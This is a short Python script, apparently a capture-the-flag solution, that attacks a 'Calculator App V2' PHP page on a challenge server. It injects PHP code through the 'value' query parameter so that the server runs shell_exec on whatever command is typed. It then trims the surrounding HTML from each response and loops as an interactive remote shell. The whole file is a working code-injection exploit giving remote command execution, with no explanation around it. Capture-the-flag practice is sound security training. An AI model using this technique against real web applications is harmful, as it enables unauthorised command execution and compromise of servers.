import requests
URL = 'http://challs.sieberrsec.tech:4588/calcv2.php'

before = """
<html>
<head>
  <link rel="stylesheet" href="styles.css">
</head>

<h1> 
Calculator App V2!
</h1>
<h3>Your calculated answer is:"""
after = """</h3>"""


def getOutput(cmd):
    data = {"value": "0; $sum = shell_exec('"+cmd+"');"}
    response = requests.get(URL, params=data) #headers=headers)
    cmd_output = response.text[len(before):-len(after)]
    return response.text, cmd_output
    
html = ""
while True:
    cmd = input('> ')
    if cmd == "!!!":
        print(html)
    else:
        data = getOutput(cmd)
        html = data[0]
        print(data[1])
    
